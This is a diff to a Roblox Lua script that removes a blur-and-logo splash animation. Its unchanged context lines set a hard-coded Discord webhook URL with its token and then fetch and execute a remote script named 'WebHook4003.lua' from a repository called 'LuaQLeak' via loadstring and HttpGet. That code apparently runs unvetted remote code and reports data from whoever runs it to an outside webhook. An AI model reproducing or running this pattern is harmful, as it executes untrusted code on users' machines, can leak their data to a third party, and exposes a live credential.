@@ -543,35 +543,6 @@ if getserver.StatusCode == 200 and gethwid.StatusCode == 200 then
                     getgenv().WebhookHere = "https://discordapp.com/api/webhooks/1231603303746633859/lhxxkk2nuqmBnYFRw55foWdBsZeEqsQt0V9wXIDBkfABdyrkNBb2FVRU6uZw6PCydlX_"
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
                     
-                    local blur = Instance.new("BlurEffect", game.Lighting)
-                    blur.Size = 0
-                    local ScreenGui = Instance.new("ScreenGui")
-                    local ImageLabel = Instance.new("ImageLabel")
-                    ScreenGui.Parent = game.CoreGui
-                    ImageLabel.Parent = ScreenGui
-                    ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
-                    ImageLabel.BackgroundTransparency = 1
-                    ImageLabel.Position = UDim2.new(0.5, -(303 / 2), 0.5, -(263 / 2))
-                    ImageLabel.Rotation = 0
-                    ImageLabel.Size = UDim2.new(0, 303, 0, 263)
-                    ImageLabel.Image = "rbxassetid://11240075159" -- LOGO
-                    ImageLabel.ImageTransparency = 1
-                    
-                    for i = 1, 50, 2 do
-                        blur.Size = i
-                        ImageLabel.ImageTransparency = ImageLabel.ImageTransparency - 0.1
-                        wait()
-                    end
-                    wait(0.1)
-                    
-                    for i = 1, 50, 2 do
-                        blur.Size = 50 - i
-                        ImageLabel.ImageTransparency = ImageLabel.ImageTransparency + 0.1
-                        wait()
-                    end
-                    blur:Destroy()
-                    ScreenGui:Destroy()
-                    
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Example.lua"))()
                     wait(2)
                     print("Scripts") --ใส่สคิปที่จะให้รันตอนมันเช้คอะไรถูก
